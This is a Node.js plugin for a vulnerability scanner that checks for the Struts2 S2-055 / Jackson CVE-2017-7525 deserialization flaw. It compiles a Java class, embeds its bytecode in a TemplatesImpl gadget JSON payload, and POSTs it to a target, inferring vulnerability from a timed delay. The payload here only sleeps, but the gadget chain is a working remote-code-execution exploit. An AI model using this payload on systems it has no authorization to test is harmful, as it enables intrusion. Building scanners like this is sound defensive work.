
module.exports={
	tags:"struts2,055,CVE-2017-7525,7525,parms",
	des:"struts2 055漏洞检测,",
	VulApps:["https://github.com/FasterXML/jackson-databind/issues/1599",
		"https://raw.githubusercontent.com/iBearcat/S2-055/master/struts2-rest-showcase.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-055"],
	test:"node checkUrl.js -u http://192.168.10.216:8082/s2-055/ --struts2 055",
	doCheck:function(url,fnCbk,parms)
	{
		var _t = this,_s = _t.self,hst = _s.parseUrl(url);
		if(!parms)
		{
			_s.request(_s.fnOptHeader({method: 'GET',uri: url,
				headers:
				{
					"Host":hst.host,
	  		    	"User-Agent": _s.g_szUa}
				}),
		    	function(e,r,b)
		    {
		    	if(!e && b)
		    	{
		    		// console.log(b);
		    		_s.fnDoBody(b,"s2-055",url,null,function(o){});
		    	};
		    });
			return;
		}

		parms || (parms = {});
		var 
			nNum = new Date().getTime()/1000,
		    // 延时测试
			nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000, 
			szJavaFileName = "MTXjava" + (nTime / 1000),
			aPayload = [_s.fnMyHelp(function(){
/*
public class MTXjava {
    public MTXjava()
    {
        try{
            Thread.sleep(5000);
        }catch(Exception e){}
        System.out.println("Ok MTX hello");
    }
    public static void main(String[] args) {
        new MTXjava();   
    }
}
*/
})];
		// 创建攻击参数
		var fnMkPl = function(s)
		{
			var a = ['"',,'":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["',,'"],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]'],b = [];
			for(var i in parms)
			{
				a[1] = i;
				a[3] = s;
				b.push(a.join(""));
			}
			return ["{",b.join(","),"}"].join("");
		};
		
		for(var i = 0; i < aPayload.length; i++)
		{
			var szT = aPayload[i].replace(/MTXjava/gmi,szJavaFileName).replace(/5000/gmi,nTime),
				szPayload = '';
			// 创建临时java文件
			_s.fs.writeFileSync(szJavaFileName + ".java", szT);
			// 编译文件
			_s.child_process.execSync("javac " + szJavaFileName + ".java");
			// 删除临时文件
			_s.fs.unlinkSync(szJavaFileName + ".java");
			// 读取class,生成攻击验证代码
			szPayload = fnMkPl(_s.fs.readFileSync(szJavaFileName + '.class').toString("base64"));
			// 删除临时文件
			_s.fs.unlinkSync(szJavaFileName + ".class");
			// 发送payload
			console.log('发送payload: ');
			console.log(szPayload);
			_s.request(_s.fnOptHeader({method: 'POST',uri: url,
				body:szPayload,
				headers:
				{
					"Host":hst.host,
	  		    	"User-Agent": _s.g_szUa,
	  		    	"content-type":"application/json"}
				}),
		    	function(e,r,b)
		    {
		    	// 判断、识别延时情况，确定是否存在漏洞
		    	_s.error(e);
		    	console.log(b);
		    	_s.fnShowBody(b);
		    	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
		    	var r = {};
		    	if(nT >= nT2)
		    	{
		    		r = {
		    			"url":url,
		    			des:"发现struts2-rest Jackson高危漏洞 CVE-2017-7525反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
		    			"send":szPayload,
		    			vul:true,
		    			href:response.request.uri.href};
		    	}
		    	_s.fnDoBody(b,"s2-055",url,null,function(o)
		    	{
	  				fnCbk(_s.copyO2O(r,o),_t);
		    	});
		    });
	    }
	}
};